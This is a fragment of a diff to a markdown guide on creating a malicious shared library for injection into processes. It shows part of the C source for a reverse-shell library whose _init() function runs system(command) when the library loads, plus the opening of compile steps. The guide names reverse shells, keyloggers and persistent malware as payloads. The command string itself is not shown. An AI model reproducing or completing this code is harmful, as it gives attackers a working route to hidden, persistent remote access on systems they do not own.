@@ -17,7 +17,7 @@ First, you need to create a custom shared library that will be injected when a p
 ### Step 2: Creating a Malicious Shared Library
 First, you need to create a custom shared library that will be injected when a process starts. This library can contain malicious code, such as a reverse shell, a keylogger, or other persistent malware.
 Code for a Malicious Shared Library (example: reverse shell):
-
+```C
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -34,6 +34,8 @@ void _init() {
     // Execute the reverse shell
     system(command);
 }
+```
+
 Steps to compile the malicious shared library:
 
 Save the above code into a file called reverse_shell.c.
